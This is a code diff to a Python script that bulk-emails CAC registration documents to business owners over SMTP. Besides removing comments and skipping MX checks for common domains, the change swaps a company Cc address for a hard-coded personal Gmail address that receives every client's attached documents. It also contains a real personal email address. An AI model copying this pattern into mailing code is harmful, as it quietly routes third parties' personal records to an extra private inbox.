@@ -53,17 +53,12 @@ logging.basicConfig(
 )
 log = logging.getLogger(__name__)
 
+# ── CC address — receives every email as a direct To: recipient ───────────────
+CC_RECIPIENT = "nwabekepraisejah@gmail.com"
+
 # ── Retry decorator ───────────────────────────────────────────────────────────
 
 def retry(max_attempts: int = 3, delay: float = 2.0, backoff: float = 2.0, exceptions: tuple = (Exception,)):
-    """
-    Retry decorator for both sync and async functions.
-    Args:
-        max_attempts: Maximum number of attempts
-        delay: Initial delay between retries in seconds
-        backoff: Multiplier applied to delay after each retry (exponential backoff)
-        exceptions: Tuple of exceptions to catch and retry on
-    """
     def decorator(func):
         @wraps(func)
         async def async_wrapper(*args, **kwargs):
@@ -73,15 +68,9 @@ def retry(max_attempts: int = 3, delay: float = 2.0, backoff: float = 2.0, excep
                     return await func(*args, **kwargs)
                 except exceptions as e:
                     if attempt == max_attempts:
-                        logging.error(
-                            "%s failed after %d attempts. Error: %s",
-                            func.__name__, max_attempts, e
-                        )
+                        logging.error("%s failed after %d attempts. Error: %s", func.__name__, max_attempts, e)
                         raise
-                    logging.warning(
-                        "%s attempt %d failed: %s. Retrying in %.2fs...",
-                        func.__name__, attempt, e, current_delay
-                    )
+                    logging.warning("%s attempt %d failed: %s. Retrying in %.2fs...", func.__name__, attempt, e, current_delay)
                     await asyncio.sleep(current_delay)
                     current_delay *= backoff
 
@@ -93,15 +82,9 @@ def retry(max_attempts: int = 3, delay: float = 2.0, backoff: float = 2.0, excep
                     return func(*args, **kwargs)
                 except exceptions as e:
                     if attempt == max_attempts:
-                        logging.error(
-                            "%s failed after %d attempts. Error: %s",
-                            func.__name__, max_attempts, e
-                        )
+                        logging.error("%s failed after %d attempts. Error: %s", func.__name__, max_attempts, e)
                         raise
-                    logging.warning(
-                        "%s attempt %d failed: %s. Retrying in %.2fs...",
-                        func.__name__, attempt, e, current_delay
-                    )
+                    logging.warning("%s attempt %d failed: %s. Retrying in %.2fs...", func.__name__, attempt, e, current_delay)
                     time.sleep(current_delay)
                     current_delay *= backoff
 
@@ -113,22 +96,14 @@ def retry(max_attempts: int = 3, delay: float = 2.0, backoff: float = 2.0, excep
 # ── Resume: load already-sent emails from one or more log files ───────────────
 
 def load_sent_emails(log_files: list[str]) -> set[str]:
-    """
-    Read one or more previous result .txt log files and return the set of
-    email addresses that were already successfully sent.
-    Handles missing files gracefully and reports per-file counts.
-    """
     already_sent: set[str] = set()
-
     if not log_files:
         return already_sent
-
     for log_file in log_files:
         path = Path(log_file)
         if not path.exists():
             log.warning(f"Resume file not found, skipping: {log_file}")
             continue
-
         count_before = len(already_sent)
         try:
             df = pd.read_csv(path, sep="\t", dtype=str).fillna("")
@@ -136,20 +111,26 @@ def load_sent_emails(log_files: list[str]) -> set[str]:
             emails = {e.strip().lower() for e in sent_rows["email"] if e.strip()}
             already_sent.update(emails)
             count_added = len(already_sent) - count_before
-            log.info(f"Resume — {path.name}: {count_added} sent emails loaded "
-                     f"({len(sent_rows)} sent rows found)")
+            log.info(f"Resume — {path.name}: {count_added} sent emails loaded ({len(sent_rows)} sent rows found)")
         except Exception as e:
             log.error(f"Could not read resume file {log_file}: {e}")
-
-    log.info(f"Resume total: {len(already_sent)} unique already-sent emails across "
-             f"{len(log_files)} file(s) — these will be skipped.")
+    log.info(f"Resume total: {len(already_sent)} unique already-sent emails across {len(log_files)} file(s) — these will be skipped.")
     return already_sent
 
 # ── Email validation ──────────────────────────────────────────────────────────
 
-EMAIL_REGEX = re.compile(
-    r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$"
-)
+EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
+
+# Domains with known-good MX records — skip DNS lookup to avoid false negatives
+# on slow or restricted resolvers (common on Nigerian ISPs)
+TRUSTED_DOMAINS = {
+    "gmail.com", "googlemail.com",
+    "yahoo.com", "yahoo.co.uk", "yahoo.com.ng",
+    "outlook.com", "hotmail.com", "hotmail.co.uk", "live.com",
+    "icloud.com", "me.com", "mac.com",
+    "protonmail.com", "proton.me",
+    "zoho.com",
+}
 
 
 def validate_email_format(email: str) -> bool:
@@ -166,15 +147,16 @@ def check_mx_record(domain: str) -> bool:
 
 
 def validate_email(email: str) -> tuple[bool, str]:
-    """Full validation: format then MX check. Returns (ok, reason)."""
+    """Full validation: format check, then MX check (skipped for trusted domains)."""
     email = email.strip().lower()
     if not validate_email_format(email):
         return False, "invalid_format"
     domain = email.split("@")[1]
+    if domain in TRUSTED_DOMAINS:
+        return True, "ok"
     if not check_mx_record(domain):
         return False, "no_mx_record"
     return True, "ok"
-
 
 # ── File name derivation ──────────────────────────────────────────────────────
 
@@ -194,7 +176,6 @@ def derive_certificate_name(status_report_name: str) -> str:
         flags=re.IGNORECASE,
     )
 
-
 # ── Email composition ─────────────────────────────────────────────────────────
 
 def build_email(
@@ -208,8 +189,7 @@ def build_email(
 ) -> MIMEMultipart:
     msg = MIMEMultipart()
     msg["From"] = sender
-    msg["To"] = recipient
-    msg["Cc"] = "Success.Isaac@ethnocentrique.com"
+    msg["To"] = f"{recipient}, {CC_RECIPIENT}"
     msg["Subject"] = f"Your CAC Registration Documents - {business_name}"
 
     body = f"""\
@@ -249,7 +229,6 @@ MCIPP
 
     return msg
 
-
 # ── Result tracking ───────────────────────────────────────────────────────────
 
 class ResultTracker:
@@ -265,15 +244,12 @@ class ResultTracker:
         self.xlsx_path = output_dir / f"results_{timestamp}.xlsx"
         self.records: list[dict] = []
 
-        # Write text header
         with open(self.log_path, "w") as f:
             f.write("\t".join(self.COLUMNS) + "\n")
 
     def record(self, **kwargs):
         kwargs.setdefault("timestamp", datetime.now().isoformat(timespec="seconds"))
         self.records.append(kwargs)
-
-        # Append to text log immediately (crash-safe)
         with open(self.log_path, "a") as f:
             row = "\t".join(str(kwargs.get(c, "")) for c in self.COLUMNS)
             f.write(row + "\n")
@@ -289,7 +265,6 @@ class ResultTracker:
             counts[r["result"]] = counts.get(r["result"], 0) + 1
         return counts
 
-
 # ── SMTP connection (auto-switches based on port) ────────────────────────────
 
 def connect_smtp(host: str, port: int, user: str, password: str) -> smtplib.SMTP:
@@ -297,33 +272,29 @@ def connect_smtp(host: str, port: int, user: str, password: str) -> smtplib.SMTP
     Connect and authenticate to an SMTP server, choosing the right
     transport automatically based on port:
 
-      465  → SMTP_SSL (implicit TLS from the start)
-      587  → SMTP + STARTTLS (upgrade plain connection to TLS)
-      2525 → SMTP + STARTTLS (common ISP-friendly fallback, same as 587)
-      25   → SMTP plain (no TLS — last resort, most providers reject this)
-      other→ attempt STARTTLS, fall back to plain if unsupported
+      465  -> SMTP_SSL (implicit TLS from the start)
+      587  -> SMTP + STARTTLS (upgrade plain connection to TLS)
+      2525 -> SMTP + STARTTLS (common ISP-friendly fallback, same as 587)
+      25   -> SMTP plain (no TLS — last resort, most providers reject this)
+      other-> attempt STARTTLS, fall back to plain if unsupported
     """
     log.info(f"Connecting to SMTP {host}:{port} ...")
 
     if port == 465:
-        # Implicit SSL — wrap the socket before any SMTP handshake
         smtp = smtplib.SMTP_SSL(host, port, timeout=30)
         smtp.ehlo()
         log.info("Transport: SMTP_SSL (port 465)")
     elif port in (587, 2525):
-        # Explicit TLS via STARTTLS
         smtp = smtplib.SMTP(host, port, timeout=30)
         smtp.ehlo()
         smtp.starttls()
         smtp.ehlo()
         log.info(f"Transport: STARTTLS (port {port})")
     elif port == 25:
-        # Plain — no encryption (most cloud providers block inbound on 25)
         smtp = smtplib.SMTP(host, port, timeout=30)
         smtp.ehlo()
         log.warning("Transport: plain SMTP (port 25) — no encryption")
     else:
-        # Unknown port — try STARTTLS, fall back to plain
         smtp = smtplib.SMTP(host, port, timeout=30)
         smtp.ehlo()
         try:
@@ -337,12 +308,11 @@ def connect_smtp(host: str, port: int, user: str, password: str) -> smtplib.SMTP
     log.info("SMTP authenticated.")
     return smtp
 
-
 # ── Core send logic ───────────────────────────────────────────────────────────
 
 @retry(max_attempts=3, delay=2.0, backoff=2.0, exceptions=(Exception,))
-def send_one(smtp: smtplib.SMTP, sender: str, msg: MIMEMultipart, recipient: str):
-    smtp.sendmail(sender, recipient, msg.as_string())
+def send_one(smtp: smtplib.SMTP, sender: str, msg: MIMEMultipart, recipients: list[str]):
+    smtp.sendmail(sender, recipients, msg.as_string())
 
 
 def run(args):
@@ -350,14 +320,10 @@ def run(args):
     output_dir      = Path(args.output)
     tracker         = ResultTracker(output_dir)
 
-    # ── Load already-sent emails from previous log files ──────────────────────
-    already_sent = load_sent_emails(args.resume or [])
+    already_sent  = load_sent_emails(args.resume or [])
+    session_limit = args.session_limit
+    session_sent  = 0
 
-    # ── Session limit ─────────────────────────────────────────────────────────
-    session_limit = args.session_limit   # None means unlimited
-    session_sent  = 0                    # successful sends THIS run only
-
-    # Load dataset
     log.info(f"Loading dataset: {args.dataset}")
     df = pd.read_excel(args.dataset, dtype=str)
     df.columns = [c.strip() for c in df.columns]
@@ -367,7 +333,6 @@ def run(args):
     if session_limit:
         log.info(f"  Session limit: {session_limit} sends — will stop after reaching it.")
 
-    # ── SMTP connection (auto-switches mode based on port) ───────────────────
     smtp = connect_smtp(args.smtp_host, args.smtp_port, args.smtp_user, args.smtp_pass)
 
     sent = failed = invalid = skipped = resumed = 0
@@ -387,16 +352,12 @@ def run(args):
 
             for idx, row in batch.iterrows():
 
-                # ── Session limit check ───────────────────────────────────────
                 if session_limit is not None and session_sent >= session_limit:
-                    log.info(
-                        f"Session limit of {session_limit} reached "
-                        f"({session_sent} sent this run). Stopping."
-                    )
+                    log.info(f"Session limit of {session_limit} reached ({session_sent} sent this run). Stopping.")
                     session_limit_hit = True
                     break
 
-                row_num   = idx + 2          # 1-indexed + header
+                row_num   = idx + 2
                 email_raw = row.get("EMAIL", "").strip()
                 firstname = row.get("FIRSTNAME", "").strip()
                 surname   = row.get("SURNAME", "").strip()
@@ -414,7 +375,6 @@ def run(args):
                     skipped += 1
                     continue
 
-                # ── Resume check ──────────────────────────────────────────────
                 if email_raw.lower() in already_sent:
                     log.info(f"Row {row_num}: {email_raw} already sent in a previous run — skipping")
                     tracker.record(
@@ -426,7 +386,6 @@ def run(args):
                     resumed += 1
                     continue
 
-                # Validate
                 ok, reason = validate_email(email_raw)
                 if not ok:
                     log.warning(f"Row {row_num}: {email_raw} -> INVALID ({reason})")
@@ -439,7 +398,6 @@ def run(args):
                     invalid += 1
                     continue
 
-                # Derive attachment paths
                 status_path = attachments_dir / src_file if src_file else None
                 cert_name   = derive_certificate_name(src_file) if src_file else ""
                 cert_path   = attachments_dir / cert_name if cert_name else None
@@ -450,9 +408,7 @@ def run(args):
                 if cert_path and not cert_path.exists():
                     missing.append(f"certificate: {cert_name}")
                 if missing and not args.allow_missing_attachments:
-                    log.warning(
-                        f"Row {row_num}: missing file(s): {missing} — skipping"
-                    )
+                    log.warning(f"Row {row_num}: missing file(s): {missing} — skipping")
                     tracker.record(
                         row_index=row_num, surname=surname, firstname=firstname,
                         email=email_raw, business_name=biz_name,
@@ -462,7 +418,6 @@ def run(args):
                     failed += 1
                     continue
 
-                # Build & send
                 msg = build_email(
                     sender=args.sender,
                     recipient=email_raw,
@@ -474,7 +429,7 @@ def run(args):
                 )
 
                 try:
-                    send_one(smtp, args.sender, msg, email_raw)
+                    send_one(smtp, args.sender, msg, [email_raw, CC_RECIPIENT])
                     log.info(f"Row {row_num}: SENT -> {email_raw} ({biz_name})")
                     tracker.record(
                         row_index=row_num, surname=surname, firstname=firstname,
@@ -505,7 +460,6 @@ def run(args):
 
                 time.sleep(args.send_delay)
 
-            # Inter-batch pause (skip after last batch or if limit hit)
             if not session_limit_hit and batch_start + args.batch_size < len(df):
                 log.info(f"Batch complete. Pausing {args.batch_delay}s ...")
                 time.sleep(args.batch_delay)
@@ -524,7 +478,6 @@ def run(args):
         log.info(f"Session limit: {session_sent}/{session_limit} used this run")
     log.info(f"Text log  -> {tracker.log_path}")
     log.info(f"Excel log -> {tracker.xlsx_path}")
-
 
 # ── CLI ───────────────────────────────────────────────────────────────────────
 
